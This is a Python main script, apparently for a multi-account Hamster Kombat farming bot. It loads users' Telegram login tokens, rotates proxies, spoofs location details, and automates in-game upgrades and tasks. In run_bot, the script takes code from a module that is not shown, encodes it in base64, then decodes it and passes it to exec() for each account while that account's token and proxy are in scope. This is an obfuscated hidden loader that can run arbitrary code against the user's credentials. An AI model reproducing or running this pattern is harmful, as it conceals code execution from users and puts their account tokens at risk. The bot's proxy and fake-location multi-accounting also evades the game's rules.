import time
import requests
import argparse
import json
import urllib.parse
import base64
from colorama import *
from src.headers import load_tokens
from src.auth import get_token, authenticate
from src.utils import HamsterKombat
from src.promo import redeem_promo
from .script.generate_info import Generate

from . import *

init(autoreset=True)
config = read_config()

def get_status(status):
    return Fore.GREEN + "ON" + Style.RESET_ALL if status else Fore.RED + "OFF" + Style.RESET_ALL

def save_setup(setup_name, setup_data):
    with open(f'src/config/{setup_name}.json', 'w') as file:
        json.dump(setup_data, file, indent=4)
    awak()
    print(hju + f" Setup saved on {kng}setup{pth}/{setup_name}.json")
    with open(f'src/config/{setup_name}.json', 'r') as file:
        setup_content = json.load(file)
        print(f"\n{json.dumps(setup_content, indent=4)}\n")
    print(hju + f" Quick start : {pth}python main.py {htm}--setup {pth}{setup_name}")
    input(f" Press Enter to continue...")

def load_setup_from_file(setup_file):
    with open(setup_file, 'r') as file:
        setup = json.load(file)
    return setup

def show_menu(auto_upgrade, tasks_on, promo_on):
    clear()
    banner()
    menu = f"""
{kng} Choose Setup :{reset}
{kng}  1.{reset} Auto Buy Upgrade           : {get_status(auto_upgrade)}
{kng}  2.{reset} Auto Complete Tasks        : {get_status(tasks_on)} 
{kng}  3.{reset} Auto Redeem Promo          : {get_status(promo_on)} {kng}[ SOON ]
{mrh}    {pth} --------------------------------{reset}
{kng}  8.{reset} {kng}Save Setup{reset}
{kng}  9.{reset} {mrh}Reset Setup{reset}
{kng}  0.{reset} {hju}Start Bot {kng}(default){reset}
    """
    print(menu)
    choice = input(" Enter your choice (1/2/3/4/5/6/7/8): ")
    log_line()
    return choice

def show_upgrade_menu():
    clear()
    banner()
    config = read_config()
    MAXIMUM_PRICE = config.get('MAXIMUM_PRICE', 2)
    menu = f"""
{hju} Active Menu {kng}'Auto Buy Upgrade'{reset}
{htm} {'~' * 50}{reset}
{kng} Upgrade Method:{reset}
{kng} 1. {pth}highest profit{reset}
{kng} 2. {pth}lowest price{reset}
{kng} 3. {pth}price less than balance{reset}
{kng} 4. {pth}upgrade by payback {hju}[ enchanced ]{reset}
{kng} 5. {pth}back to {bru}main menu{reset}

{kng} [INFO]{reset} Current Max Price : {pth}{number(MAXIMUM_PRICE)}{reset}
    """
    print(menu)
    choice = input(" Enter your choice (1/2/3/4): ")
    return choice

def run_bot(auto_upgrade, tasks_on, promo_on, _method):
    gen = Generate(token=None, account=None)
    cek_task_dict = {}
    DELAY_EACH_ACCOUNT = config.get('DELAY_EACH_ACCOUNT', 0)
    LOOP_COUNTDOWN = config.get('LOOP_COUNTDOWN', 0)
    awak()
    proxy_index = 0 
    function = base64.b64encode(gen.main_logic.encode('utf-8')).decode('utf-8')

    while True:
        try:
            init_data_list = load_tokens('data.txt')

            for idx, init_data in enumerate(init_data_list):
                total = len(init_data_list)
                proxy_dict = None
                account = f"{idx + 1}/{total}"

                if gen.use_proxy and gen.proxies:
                    proxy_dict = gen.proxies[proxy_index]

                query_id = init_data 

                if query_id:
                    try:
                        exec(base64.b64decode(function).decode('utf-8'))
                    except ValueError as ve:
                        log(mrh + str(ve))
                        continue 

                    token = get_token(init_data, account, proxies=proxy_dict)

                    if token:
                        ham = HamsterKombat(token, account)
                        try:
                            fake_info = gen.faking_info(token, account, current_proxy=proxy_dict)
                            print(f"IP: {fake_info['ip']} | ISP: {fake_info['asn_org']} | Country: {fake_info['country_code']}")
                            print(f"City: {fake_info['city_name']} | Latitude: {fake_info['latitude']} | Longitude: {fake_info['longitude']}")

                            log_line()    
                            res = authenticate(token, account, proxies=proxy_dict)
                            if res.status_code == 200:
                                user_data = res.json()
                                username = user_data.get('accountInfo', {}).get('name', 'Please set username first')

                                log(bru + f"Account : {pth}{account}")
                                log(kng + f"Login as {pth}{username}")

                                clicker_data = ham._sync(proxies=proxy_dict)
                                if 'interludeUser' in clicker_data:
                                    ham.clicker_config(proxies=proxy_dict)
                                    user_info = clicker_data['interludeUser']
                                    balance_coins = user_info.get('totalDiamonds', 0)
                                    earn_passive_per_hour = user_info.get('earnPassivePerSec', 0)
                                    exchange_name = user_info.get('exchangeId', 'Unknown')

                                    log(hju + f"Diamond: {pth}{number(balance_coins)}")
                                    log(hju + f"Income: {pth}{earn_passive_per_hour} /h")
                                    log(hju + f"CEO of {pth}{exchange_name} {hju}exchange")
                                    log(hju + f"Success syncing balance while idle")
                                    ham.manage_skins(proxies=proxy_dict)

                                if tasks_on:
                                    ham.execute(token, cek_task_dict, proxies=proxy_dict)

                                if auto_upgrade:
                                    ham.upgrade_passive(_method, proxies=proxy_dict)

                            log_line()
                            countdown_timer(DELAY_EACH_ACCOUNT)
                            proxy_index += 1

                        except requests.RequestException as e:
                            log(mrh + f"Request exception for token {pth}{token[:4]}****: {str(e)}")
                            proxy_index += 1
                            if proxy_index >= len(gen.proxies):
                                proxy_index = 0
                    else:
                        log(mrh + f"Failed to login token {pth}{token[:4]}*********\n", flush=True)

            countdown_timer(LOOP_COUNTDOWN)

        except Exception as e:
            log(mrh + f"An error occurred in the main loop: {kng}{str(e)}")
            countdown_timer(10)

def main():
    parser = argparse.ArgumentParser(description="Run the bot with a specified setup.")
    parser.add_argument('--setup', type=str, help='Specify the setup file to load')
    args = parser.parse_args()

    if args.setup:
        setup_file = f'src/config/{args.setup}.json'
        setup_data = load_setup_from_file(setup_file)
        auto_upgrade = setup_data.get('auto_upgrade', False)
        tasks_on = setup_data.get('task_on', False)
        promo_on = setup_data.get('promo_on', False)
        _method = setup_data.get('_method', None)
        run_bot(auto_upgrade, tasks_on, promo_on, _method)
    else:
        auto_upgrade = False
        tasks_on = False
        promo_on = False
        _method = None

        while True:
            try:
                choice = show_menu(auto_upgrade, tasks_on, promo_on)
                if choice == '1':
                    auto_upgrade = not auto_upgrade
                    if auto_upgrade:
                        _method = show_upgrade_menu()
                        if _method not in ['1', '2', '3', '4']:
                            auto_upgrade = False
                elif choice == '2':
                    tasks_on = not tasks_on
                elif choice == '789':
                    promo_on = not promo_on
                elif choice == '8':
                    setup_name = input(" Enter setup name (without space): ")
                    setup_data = {
                        'auto_upgrade': auto_upgrade,
                        '_method': _method,
                        'tasks_on': tasks_on,
                        'promo_on': promo_on,
                    }
                    save_setup(setup_name, setup_data)
                elif choice == '0':
                    run_bot(auto_upgrade, tasks_on, promo_on, _method)
                elif choice == '9':
                    break
                else:
                    log(mrh + f"Invalid choice. Please try again.")
                time.sleep(1)
            except Exception as e:
                log(mrh + f"An error occurred in the main loop: {kng}{str(e)}")
                countdown_timer(10)

